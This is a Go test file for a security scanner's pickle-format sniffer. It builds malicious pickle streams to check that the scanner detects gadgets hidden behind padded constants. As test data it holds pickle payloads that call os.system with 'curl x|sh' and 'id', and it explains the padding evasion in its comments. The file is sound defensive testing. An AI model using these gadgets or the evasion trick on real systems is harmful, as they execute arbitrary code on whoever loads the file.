package pickle

import (
	"bytes"
	"testing"

	"github.com/fr0g-66723067-io/sc4n/internal/artifact"
	"github.com/fr0g-66723067-io/sc4n/internal/limits"
	"github.com/fr0g-66723067-io/sc4n/internal/source"
)

// fatConstantGadget builds a stream whose first constant exceeds the probe budget:
// PROTO 4, one BINUNICODE of n bytes, then GLOBAL os.system + a string + REDUCE.
// The gadget is the last thing in the stream, behind the fat constant.
func fatConstantGadget(prefix []byte, n int) []byte {
	b := append([]byte{}, prefix...)
	b = append(b, opPROTO, 4, opBINUNICODE, byte(n), byte(n>>8), byte(n>>16), byte(n>>24))
	b = append(b, make([]byte, n)...)
	b = append(b, []byte("cos\nsystem\n(S'curl x|sh'\ntR.")...)
	return b
}

// TestSniffClaimsFatConstantBehindAPrefix pins the miss a padded constant caused:
// the silent probe walk stops at maxProbeBytes, so a stream whose first constant is
// larger than the budget left the file dispatched "unknown" — no parser, no
// indicator pass, an empty finding list — while the same stream with a smaller
// constant was reported. The number of bytes in the constant is the attacker's to
// choose, which is what made it a reliable way to hide the gadget behind it.
func TestSniffClaimsFatConstantBehindAPrefix(t *testing.T) {
	for _, prefix := range [][]byte{nil, []byte("junk"), []byte("MZ"), []byte("\x7fELF"), []byte("\x00\x11"), []byte("####")} {
		data := fatConstantGadget(prefix, maxProbeBytes+4096)
		s := source.Mem("fat.pkl", data)
		got, ok := sniff(s, limits.Default())
		s.Close()
		if !ok || got != artifact.FormatPickle {
			t.Fatalf("prefix %q: sniff = %s, %v; want pickle", prefix, got, ok)
		}
	}
}

// TestSniffBudgetTruncationIsEvidence pins the widened contract: a protocol-0
// walk that consumes the probe budget without a structural error is evidence
// enough to claim the stream. The earlier rule rejected it, which let a padded
// constant hide a gadget behind the probe on a protocol-less stream.
func TestSniffBudgetTruncationIsEvidence(t *testing.T) {
	// A protocol-0 stream of plain opcodes with no STOP, longer than the budget.
	b := make([]byte, 0, maxProbeBytes+4096)
	for len(b) < maxProbeBytes+4096 {
		b = append(b, opEMPTY_LIST)
	}
	s := source.Mem("noproto.pkl", b)
	got, ok := sniff(s, limits.Default())
	s.Close()
	if !ok || got != artifact.FormatPickle {
		t.Fatalf("a protocol-less stream truncated by the budget was not claimed: %s, %v", got, ok)
	}
}

// TestSniffPrefixProbeIsBounded documents the bound that keeps the second look
// cheap: a protocol byte beyond the prefix (the nullifAI prefix is a few bytes) does
// not reach the pickle sniffer, so an ordinary text file with bytes that merely
// contain 0x80 does not get claimed and produce a page of structural findings.
func TestSniffPrefixProbeIsBounded(t *testing.T) {
	prefix := make([]byte, prefixProbe+64)
	for i := range prefix {
		prefix[i] = '#'
	}
	data := append(prefix, []byte{opPROTO, 4, opEMPTY_DICT, opSTOP}...)
	s := source.Mem("late.pkl", data)
	_, ok := sniff(s, limits.Default())
	s.Close()
	if ok {
		t.Fatalf("a stream starting past the %d-byte prefix probe was claimed", prefixProbe)
	}
}

// TestSniffClaimsStreamWhoseLaterLineExceedsCap pins the second half of the
// protocol-0 overflow case. The first opcode's oversized line was already
// evidence, but the same line at any later position was fatal in both the probe
// and the real walk: the artifact was dispatched "unknown" (no parser, no
// indicator pass) or claimed and truncated before the REDUCE, so the gadget
// behind a padded constant was never analysed. The line is skipped, and the
// walk reaches the loader-executable call after it.
func TestSniffClaimsStreamWhoseLaterLineExceedsCap(t *testing.T) {
	data := []byte{opEMPTY_LIST, opSTRING}
	data = append(data, bytes.Repeat([]byte{'a'}, int(limits.Default().MaxStringBlob)+1)...)
	data = append(data, '\n')
	data = append(data, []byte("cos\nsystem\n(S'id'\ntR.")...)
	s := source.Mem("late-line.pkl", data)
	got, ok := sniff(s, limits.Default())
	s.Close()
	if !ok || got != artifact.FormatPickle {
		t.Fatalf("sniff = %s, %v; want pickle", got, ok)
	}
	_, fs := walk(t, data)
	if !hasRule(fs, "SC4N-PICKLE-GLOBAL-CRITICAL") {
		t.Fatalf("the gadget after the padded line was not reported; findings=%v", ruleIDs(fs))
	}
}

// TestSniffStillRejectsPythonSource is the regression guard for the widened head
// test: a Python source file opens with the same letters a protocol-0 pickle does,
// and claiming one would manufacture findings for every .py in a repository.
func TestSniffStillRejectsPythonSource(t *testing.T) {
	for _, src := range []string{
		"class Foo:\n    def bar(self):\n        return 1\n",
		"copy the file\nand then\n",
		"# a comment\nimport os\nos.system('id')\n",
	} {
		s := source.Mem("mod.py", []byte(src))
		got, ok := sniff(s, limits.Default())
		s.Close()
		if ok {
			t.Fatalf("python source claimed as %s: %q", got, src)
		}
	}
}
